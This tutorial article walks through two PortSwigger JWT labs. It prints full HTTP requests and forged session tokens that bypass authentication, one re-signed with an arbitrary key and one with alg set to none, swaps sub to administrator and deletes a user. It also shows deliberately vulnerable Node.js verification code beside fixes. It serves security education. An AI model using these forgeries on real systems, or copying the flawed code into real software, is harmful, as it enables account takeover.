# Article 1: JWT Fundamentals and Insecure Signature Verification

> This is **Article 1 of 4** in a series of articles about JWT vulnerabilities, based on labs from [PortSwigger Web Security Academy](https://portswigger.net/web-security/jwt).

**Labs covered:**
- Lab 1: JWT authentication bypass via unverified signature
- Lab 2: JWT authentication bypass via flawed signature verification

---

# About this article

All examples, requests, and exploitation steps are based on real lab walkthroughs.

JWTs are extremely common in **microservice architectures**. When an application is split into many distributed back-end services, keeping a shared server-side session store becomes hard and adds latency. JWT solves this by storing all the useful information about the user **client-side**, inside the token itself each service can validate the token independently without contacting a central session database.

The integrity of a JWT is protected by a **cryptographic signature**:

- **Symmetric (HS256):** the same secret key is used to both sign and verify the token.
- **Asymmetric (RS256):** a key pair is used — the **private key** signs the token, and the **public key** verifies the signature.

Because the header and payload are simply base64url-encoded JSON (readable and modifiable by anyone), the security of the whole mechanism relies almost entirely on how well this signature is created and verified. That is exactly what the following labs will demonstrate.

---

## 1. Introduction to JWTs

JSON Web Tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They are most commonly used to send information ("claims") about users as part of authentication, session handling, and access control mechanisms.

Unlike classic session tokens, all of the data a server needs is stored **client-side** within the JWT itself. This makes JWTs a popular choice for highly distributed websites where users need to interact seamlessly with multiple back-end servers.

### 1.1 JWT Format

A JWT consists of three parts, each separated by a dot:

```
eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
```

| Part | Description |
|---|---|
| **Header** | base64url-encoded JSON with metadata (e.g., `alg`, `typ`) |
| **Payload** | base64url-encoded JSON with claims about the user |
| **Signature** | cryptographic signature over `header.payload` |

Decoding the payload reveals the claims:

```json
{
  "iss": "portswigger",
  "exp": 1648037164,
  "name": "Carlos Montoya",
  "sub": "carlos",
  "role": "blog_author",
  "email": "carlos@carlos-montoya.net",
  "iat": 1516239022
}
```

In most cases, this data can be easily read or modified by anyone with access to the token. Therefore, the **security of any JWT-based mechanism is heavily reliant on the cryptographic signature**.

### 1.2 How JWT Attacks Arise

JWT vulnerabilities typically arise due to **flawed JWT handling within the application itself**. The related specifications are relatively flexible by design, allowing developers to decide many implementation details themselves. This can result in them accidentally introducing vulnerabilities even when using battle-hardened libraries.

These implementation flaws usually mean that the **signature is not verified properly**. This enables an attacker to tamper with the values passed to the application via the token's payload. Even if the signature is robustly verified, whether it can truly be trusted relies heavily on the server's secret key remaining a secret. If this key is leaked, guessed, or brute-forced, an attacker can generate a valid signature for any arbitrary token, compromising the entire mechanism.

### 1.3 Impact

The impact of JWT attacks is usually **severe**. If an attacker can create their own valid tokens with arbitrary values, they may be able to:
- Escalate their own privileges
- Impersonate other users
- Take full control of accounts

---

## 2. Lab 1: JWT authentication bypass via unverified signature

### 2.1 Lab Description

> This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the **server doesn't verify the signature** of any JWTs that it receives.
>
> **Goal:** Modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.
>
> **Credentials:** `wiener:peter`

### 2.2 Exploitation Walkthrough

#### Step 1 — Obtain a valid session token

Log in with the provided credentials `wiener:peter` to receive a legitimate JWT session cookie.

**Request:**

```http
POST /login HTTP/1.1
Host: 0a960068037b36ea8401202b006e00d0.web-security-academy.net
Connection: keep-alive
Content-Length: 68
Cache-Control: max-age=0
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a960068037b36ea8401202b006e00d0.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a960068037b36ea8401202b006e00d0.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=

csrf=heiTQBXiv3gx4k9agc3OwpjAVWTOlvx1&username=wiener&password=peter
```

**Response:**

```http
HTTP/1.1 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=eyJraWQiOiJjZmRkOWNhZC0wOTM1LTRhYmYtYjAzYS04YmU0Nzk5NjA2NzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5MzU0OCwic3ViIjoid2llbmVyIn0.X91LqDzf3A_Cuw2fih8nCs_lhNOblczTycZbnKDqFW9yvC9fDskgNklj_Ib3aPL0dURn3ue2tQRU_cu92eBiZkOxTPFmt9ON-fzFYYMCZPx-ppiTV707UqBytW6bQzwvjajNWWZ2FHioOm9LoFII6_8vImsz6nf11VH8cO2NhhrdHgy6laEjmlmk7e8zjQnc9dEIuhRV8Mv_qS_bzJ-8ax09gmXILDPlf6vM_lec-cqBTxhEIR7fnYZBXh4eN0UsLqaermVFu56YMTbUelFg6kmEqWVIVpQLd-V5Xv5KQYw67X9h5kyeH129drn-gdReOsd-MrY2RtiDbZIiWr-3Og; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Encoding: gzip
Connection: close
Content-Length: 0


```

![[Articles/JWT Articles/Article 1/lab_1/Screenshot_20260830_073922.png]]

The resulting session token:

```
eyJraWQiOiJjZmRkOWNhZC0wOTM1LTRhYmYtYjAzYS04YmU0Nzk5NjA2NzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5MzU0OCwic3ViIjoid2llbmVyIn0.X91LqDzf3A_Cuw2fih8nCs_lhNOblczTycZbnKDqFW9yvC9fDskgNklj_Ib3aPL0dURn3ue2tQRU_cu92eBiZkOxTPFmt9ON-fzFYYMCZPx-ppiTV707UqBytW6bQzwvjajNWWZ2FHioOm9LoFII6_8vImsz6nf11VH8cO2NhhrdHgy6laEjmlmk7e8zjQnc9dEIuhRV8Mv_qS_bzJ-8ax09gmXILDPlf6vM_lec-cqBTxhEIR7fnYZBXh4eN0UsLqaermVFu56YMTbUelFg6kmEqWVIVpQLd-V5Xv5KQYw67X9h5kyeH129drn-gdReOsd-MrY2RtiDbZIiWr-3Og
```

#### Step 2 — Analyze the token structure

Decode the token to inspect its header and payload.

![[Articles/JWT Articles/Article 1/lab_1/Screenshot_20260830_074618.png]]

#### Step 3 — Verify the token works (baseline request)

Send a simple request to `/my-account` to confirm the original token is accepted.

```http
GET /my-account HTTP/1.1
Host: 0a960068037b36ea8401202b006e00d0.web-security-academy.net
Connection: keep-alive
Content-Length: 68
Cache-Control: max-age=0
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a960068037b36ea8401202b006e00d0.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a960068037b36ea8401202b006e00d0.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiJjZmRkOWNhZC0wOTM1LTRhYmYtYjAzYS04YmU0Nzk5NjA2NzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5MzU0OCwic3ViIjoid2llbmVyIn0.X91LqDzf3A_Cuw2fih8nCs_lhNOblczTycZbnKDqFW9yvC9fDskgNklj_Ib3aPL0dURn3ue2tQRU_cu92eBiZkOxTPFmt9ON-fzFYYMCZPx-ppiTV707UqBytW6bQzwvjajNWWZ2FHioOm9LoFII6_8vImsz6nf11VH8cO2NhhrdHgy6laEjmlmk7e8zjQnc9dEIuhRV8Mv_qS_bzJ-8ax09gmXILDPlf6vM_lec-cqBTxhEIR7fnYZBXh4eN0UsLqaermVFu56YMTbUelFg6kmEqWVIVpQLd-V5Xv5KQYw67X9h5kyeH129drn-gdReOsd-MrY2RtiDbZIiWr-3Og

csrf=heiTQBXiv3gx4k9agc3OwpjAVWTOlvx1
```

**Response** (headers only):

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3451
```

![[Articles/JWT Articles/Article 1/lab_1/Screenshot_20260830_074844.png]]

#### Step 4 — Attempt 1: add an `isAdmin` claim

Since the lab intentionally does **not** verify the signature, we can forge a token. First, try adding a custom `isAdmin: true` claim and sign it with an arbitrary key (here: the word `word`).

![[Articles/JWT Articles/Article 1/lab_1/Screenshot_20260830_075549.png]]

Forged token with `isAdmin`:

>Important:
>We need to change the payload signing algorithm from RS256 to HS256 and sign it with a random symmetric key, which can be any string.

```
eyJraWQiOiJlNTU3MmVkMi1iMTgwLTQ1NGItOGY1My1kMDU3ZmUzMGVjNzEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5NjYyMCwic3ViIjoid2llbmVyIiwiaXNBZG1pbiI6dHJ1ZX0.5iy9nzCcQjdMIWQIn9XTxqfetLyFiOfwxcSKNaEQUr8
```

Payload claim:

```JSON
"isAdmin": true
```

Request `/admin` with this token:

```http
GET /admin HTTP/1.1
Host: 0ab700ec046b634080043f380089005f.web-security-academy.net
Connection: keep-alive
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab700ec046b634080043f380089005f.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiJlNTU3MmVkMi1iMTgwLTQ1NGItOGY1My1kMDU3ZmUzMGVjNzEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5NjYyMCwic3ViIjoid2llbmVyIiwiaXNBZG1pbiI6dHJ1ZX0.5iy9nzCcQjdMIWQIn9XTxqfetLyFiOfwxcSKNaEQUr8


```

Result — **401 Unauthorized**:

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 2718
```

`isAdmin` does not grant access.

#### Step 5 — Attempt 2: add a `role` claim

Try a `role: admin` claim instead:

![[Articles/JWT Articles/Article 1/lab_1/Screenshot_20260830_083439.png]]

```
eyJraWQiOiJlNTU3MmVkMi1iMTgwLTQ1NGItOGY1My1kMDU3ZmUzMGVjNzEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5NjYyMCwic3ViIjoid2llbmVyIiwicm9sZSI6ImFkbWluIn0.r79Dbo90liHPA4Dq93Ha4Tk9uWJ4YWoVtvmzZop2lGk
```

```http
GET /admin HTTP/1.1
Host: 0ab700ec046b634080043f380089005f.web-security-academy.net
Connection: keep-alive
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab700ec046b634080043f380089005f.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiJlNTU3MmVkMi1iMTgwLTQ1NGItOGY1My1kMDU3ZmUzMGVjNzEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5NjYyMCwic3ViIjoid2llbmVyIiwicm9sZSI6ImFkbWluIn0.r79Dbo90liHPA4Dq93Ha4Tk9uWJ4YWoVtvmzZop2lGk


```

Result — **401 Unauthorized** again:

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 2718
```

`role` is also ignored — the app does **not** use role-based claims.

#### Step 6 — Insight: there are no roles, only accounts

After analyzing the responses, the conclusion is that this application has **no roles** — access is decided by **which account** the token belongs to. Therefore, we need to impersonate the existing `administrator` account by changing the `sub` claim from `wiener` to `administrator`. 

This behavior makes sense when we look at how sub works. According to RFC 7519, the sub (Subject) claim is designed to identify the subject of the token — usually the user — and is not intended for role-based authorization.

Applications commonly use sub as the primary session lookup key in their database. As a result, changing sub from wiener to administrator completely swaps the session context, which is why it grants full admin access.

The distinction matters: sub = who you are, while claims such as role or isAdmin = what you may do. This lab has no role-based mechanism at all  — access is decided purely by which account the token identifies, so impersonating the administrator subject in sub is sufficient to take over the admin session.

![[Articles/JWT Articles/Article 1/lab_1/Screenshot_20260830_083756.png]]

#### Step 7 — Forge the final token (`sub: administrator`)

Change the `sub` claim and re-sign the token (signature still not verified):

![[Articles/JWT Articles/Article 1/lab_1/Screenshot_20260830_083944.png]]

Final forged token:

```
eyJraWQiOiJlNTU3MmVkMi1iMTgwLTQ1NGItOGY1My1kMDU3ZmUzMGVjNzEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5NjYyMCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.ro8g-4KitM1SiM6NiCkrnKmvVbG57YFBIZleHH9si_Y
```

Request `/admin`:

```http
GET /admin HTTP/1.1
Host: 0ab700ec046b634080043f380089005f.web-security-academy.net
Connection: keep-alive
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab700ec046b634080043f380089005f.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiJlNTU3MmVkMi1iMTgwLTQ1NGItOGY1My1kMDU3ZmUzMGVjNzEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5NjYyMCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.ro8g-4KitM1SiM6NiCkrnKmvVbG57YFBIZleHH9si_Y


```

Result — **200 OK**, admin access granted:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3242
```

Admin panel reached:

![[Articles/JWT Articles/Article 1/lab_1/Screenshot_20260830_084137.png]]

#### Step 8 — Delete the user `carlos`

Send the deletion request:

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: 0ab700ec046b634080043f380089005f.web-security-academy.net
Connection: keep-alive
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab700ec046b634080043f380089005f.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiJlNTU3MmVkMi1iMTgwLTQ1NGItOGY1My1kMDU3ZmUzMGVjNzEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5NjYyMCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.ro8g-4KitM1SiM6NiCkrnKmvVbG57YFBIZleHH9si_Y


```

**Responses** — redirect followed by success:

```http
HTTP/1.1 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Encoding: gzip
Connection: close
Content-Length: 0


```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 6269
```

![[Articles/JWT Articles/Article 1/lab_1/Screenshot_20260830_084422.png]]

The user was successfully deleted — **the lab is solved**.

### 2.3 Vulnerable Node.js Express Code

```js
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

// BUG: the signature is NEVER verified.
// jwt.decode() does NOT validate the signature — it only decodes the token.
app.get('/admin', (req, res) => {
  const token = req.cookies.session;

  const decoded = jwt.decode(token, { complete: true });   // no verify!

  if (decoded.payload.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

**Why it's vulnerable:** the developer used `jwt.decode()` instead of `jwt.verify()`. `decode()` only parses the token and ignores the signature entirely. An attacker can set `sub: administrator` and it will be accepted.

### 2.4 Fix

```js
app.get('/admin', (req, res) => {
  const token = req.cookies.session;
  // verify() validates the signature with the server's secret
  const decoded = jwt.verify(token, SERVER_SECRET, { algorithms: ['HS256'] });

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

---

## 3. Lab 2: JWT authentication bypass via flawed signature verification

### 3.1 Lab Description

> This lab uses a JWT-based mechanism for handling sessions. The server is **insecurely configured to accept unsigned JWTs**.
>
> **Goal:** Modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.
>
> **Credentials:** `wiener:peter`

### 3.2 Exploitation Walkthrough

#### Step 1 — Obtain a valid session token

Log in with `wiener:peter` and capture the JWT session cookie.

```http
GET /my-account?id=wiener HTTP/1.1
Host: 0a510057048d651e81ef1649000e0002.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://0a510057048d651e81ef1649000e0002.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiI5MmYzMWYxMy0zMWM4LTQ3NzQtYTRkZC0xOTU3ZTFmZTg2NzIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODA5OTM3OCwic3ViIjoid2llbmVyIn0.F8keRsxIoxdw4h07cHtpk7YBPyDDN9HIiAAXgvzNnoSGGlQ3nAwUHR1GKilXmezgTkWppMNOwUTY-BwVEWYtaplsl1ZZjYDICmqEL_8OF9Jw6-ktT9s2zd1inW26VUe7Xbif1Oqn3kIU8RDbitBJiGngc4v2oyMdCQI3XqC7ncakHt9T1oWl5SkTRaUqn89ko_vsm3U4d2oT1m8n11yNePL4P7yzriv8xBm5ZCGG6T227RbAwVdGLxGp3gMDUVKhrd4ATs0N_y78Gw3WKGiqKibGXGGJy-CppdTcST6MQL1-sdE-0z9X0SXEvUGz-tSrKPObXL_Nb-Madjnjh8qMXg


```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3478
```

The captured session token:

```
eyJraWQiOiIzMTNiMzliYy1jZTZlLTQ1NDctODU1Ni0xNWE2YTMyYjNkYzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODEwMzA1NCwic3ViIjoid2llbmVyIn0.S28ZFQJXtBkURoD1ILzspp8xElwY2uSLi9r1p7t5v12IGsDhw2Mhz_Oi2M_9iXLueBSNPK6bx-LM53Q6f87AtWrgNgBmN4J8n3bkkslq2mjF8FflqwuDd9rVyXCn2X180I2b-IlfyUSPVThYjUCdOb0N3A5qeRcVs1bJOQDMaUt2xVSzSocbcsfy3t62O9dtkVG7tQdRxMSkuhxcz9yg3nDTIRN9MbbKqSURBd03bQpxKie5mJTvEdMqWDmODNVJsUsU06LcSn9ewZapqXsepo5xeGL3YedvBliu5nSgcOte4G23Vm0AdgU6vzWnoH1cZHKoaFRrEkekld6hrsSHdw
```

![[Articles/JWT Articles/Article 1/lab_2/Screenshot_20260830_092246.png]]

#### Step 2 — Forge the token: `alg: none` + `sub: administrator`

The server accepts unsigned JWTs. Change the `alg` header to `none` and set the `sub` claim to `administrator`.

![[Articles/JWT Articles/Article 1/lab_2/Screenshot_20260830_093340.png]]

Forged unsigned token:

```
eyJraWQiOiIzMTNiMzliYy1jZTZlLTQ1NDctODU1Ni0xNWE2YTMyYjNkYzYiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODEwMzA1NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

#### Step 3 — Request `/admin` with the forged token

```http
GET /admin HTTP/1.1
Host: 0ae90069040fb506833e98a3009f0048.web-security-academy.net
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Referer: https://0ae90069040fb506833e98a3009f0048.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJraWQiOiIzMTNiMzliYy1jZTZlLTQ1NDctODU1Ni0xNWE2YTMyYjNkYzYiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4ODEwMzA1NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.


```

**Response — 200 OK, admin access granted:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3269
```

> **Note:** Even when `alg` is set to `none`, you must keep the trailing dot at the end of the payload (empty signature segment). This makes the token well-formed so the JWT parser can handle it correctly.

![[Articles/JWT Articles/Article 1/lab_2/Screenshot_20260830_102014.png]]

#### Step 4 — Delete `carlos` (lab solved)

Admin access was obtained, and the lab is solved by deleting the target user.

![[Articles/JWT Articles/Article 1/lab_2/Screenshot_20260830_102303.png]]

### 3.3 Vulnerable Node.js Express Code

```js
const jwt = require('jsonwebtoken');
const express = require('express');
const app = express();

// BUG: the 'none' algorithm is allowed, and the signature can be omitted.
// The attacker sets alg:none in the header → server accepts an unsigned token.
app.get('/admin', (req, res) => {
  const token = req.cookies.session;

  const decoded = jwt.verify(token, SERVER_SECRET, {
    algorithms: ['HS256', 'none']    // 'none' must never be allowed
  });

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

**Why it's vulnerable:** the `alg` parameter in the header is user-controlled. When the server allows `none`, the signature can be removed entirely, and the token is treated as valid.

### 3.4 Fix

```js
app.get('/admin', (req, res) => {
  const token = req.cookies.session;
  // Only allow signed algorithms, never 'none'
  const decoded = jwt.verify(token, SERVER_SECRET, {
    algorithms: ['HS256']
  });

  if (decoded.sub === 'administrator') {
    res.send('Admin panel');
  } else {
    res.send('Forbidden');
  }
});
```

---

## 4. CVSS Score

For both labs, the vulnerability is an **authentication bypass** allowing privilege escalation to an administrator account.

### CVSS v3.1 Vector

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

| Metric        | Value         | Explanation                                                  |
| ------------- | ------------- | ------------------------------------------------------------ |
| **AV**        | Network (N)   | Attacker exploits it remotely via HTTP                       |
| **AC**        | Low (L)       | No special conditions; trivial to exploit                    |
| **PR**        | Low (L)       | Needs only a low-privileged account (`wiener`)               |
| **UI**        | None (N)      | No user interaction required                                 |
| **S**         | Unchanged (U) | Impact stays within the affected component                   |
| **C / I / A** | High (H)      | Full account takeover, privilege escalation, data compromise |

**Base Score: 8.8 (High)**

### Explanation

The vulnerability allows an unprivileged user to forge a valid session token and impersonate the `administrator`. Since the attacker can gain full administrative control (high confidentiality, integrity, and availability impact), and exploitation is straightforward over the network, the score is **8.8 High**.

> Note: In some environments this could be rated 9.8 (Critical) if the attacker does not require any valid account (PR:N), for example when the admin role can be reached without a low-privileged session.

---

## 5. Key Takeaways

| #   | Lesson                                                                                           |
| --- | ------------------------------------------------------------------------------------------------ |
| 1   | Always use `jwt.verify()`, never `jwt.decode()`, to validate tokens                              |
| 2   | Never allow `alg: none` — enforce a strict whitelist of algorithms                               |
| 3   | JWT header and payload are **user-controlled** — never trust them without signature verification |
| 4   | Even battle-hardened libraries are insecure if misconfigured                                     |
